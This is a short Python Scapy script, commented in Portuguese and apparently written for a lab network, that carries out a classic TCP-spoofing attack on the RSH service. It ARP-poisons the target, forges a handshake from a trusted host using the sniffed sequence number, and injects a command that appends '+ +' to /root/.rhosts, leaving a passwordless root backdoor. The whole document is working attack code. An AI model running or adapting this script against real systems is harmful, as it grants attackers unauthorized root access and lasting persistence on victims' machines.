#!/usr/bin/env python3
from scapy.all import *
import time

IP_ATACANTE = "10.0.2.10"
IP_ALVO = "10.0.2.20"
IP_CONFIAVEL = "10.0.2.30"

PORTA_RSH = 514
PORTA_ORIG = 1023
MEU_SEQ = 777777

def envenenar_arp():
    print("[*] 0. Envenenando o cache ARP do Alvo (ARP Spoofing)...")
    # op=1 é um ARP Request enviado via Broadcast Ethernet (Ether). 
    # Isso força o alvo a atualizar sua tabela ARP com o nosso MAC.
    pacote_arp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=IP_ALVO, psrc=IP_CONFIAVEL)
    sendp(pacote_arp, verbose=0)
    time.sleep(1.5) # Um tempo um pouco maior para garantir que a rede propague

def spoof_syn():
    print("[*] 1. Enviando pacote SYN forjado (spoofing)...")
    ip = IP(src=IP_CONFIAVEL, dst=IP_ALVO)
    tcp = TCP(sport=PORTA_ORIG, dport=PORTA_RSH, flags="S", seq=MEU_SEQ)
    send(ip/tcp, verbose=0)

def captura_e_injetar(pkt):
    if TCP in pkt and pkt[TCP].flags == "SA" and pkt[IP].src == IP_ALVO and pkt[IP].dst == IP_CONFIAVEL:
        isn_alvo = pkt[TCP].seq
        print(f"[*] 2. SYN+ACK capturado! O ISN do Alvo é: {isn_alvo}")
        
        ack_num = isn_alvo + 1
        seq_num = MEU_SEQ + 1
        
        print("[*] 3. Enviando ACK para completar o Handshake...")
        ip = IP(src=IP_CONFIAVEL, dst=IP_ALVO)
        tcp_ack = TCP(sport=PORTA_ORIG, dport=PORTA_RSH, flags="A", seq=seq_num, ack=ack_num)
        send(ip/tcp_ack, verbose=0)
        
        print("[*] 4. Enviando payload para abrir o Backdoor via RSH...")
        # O \x00 no início (representando o '0') impede que o RSH tente abrir uma conexão de erro
        payload = b"0\x00root\x00root\x00echo + + >> /root/.rhosts\x00"
        
        tcp_push = TCP(sport=PORTA_ORIG, dport=PORTA_RSH, flags="PA", seq=seq_num, ack=ack_num)
        send(ip/tcp_push/payload, verbose=0)
        print("[+] Ataque finalizado! O backdoor deve estar aberto.")

filtro = f"tcp and src host {IP_ALVO} and dst host {IP_CONFIAVEL}"

# Fluxo de execução
envenenar_arp()

print("[*] Iniciando o Sniffer na rede...")
sniffer = AsyncSniffer(filter=filtro, prn=captura_e_injetar)
sniffer.start()

time.sleep(1)
spoof_syn()

# Dá tempo suficiente para o Sniffer capturar tudo antes de encerrar
time.sleep(4)
sniffer.stop()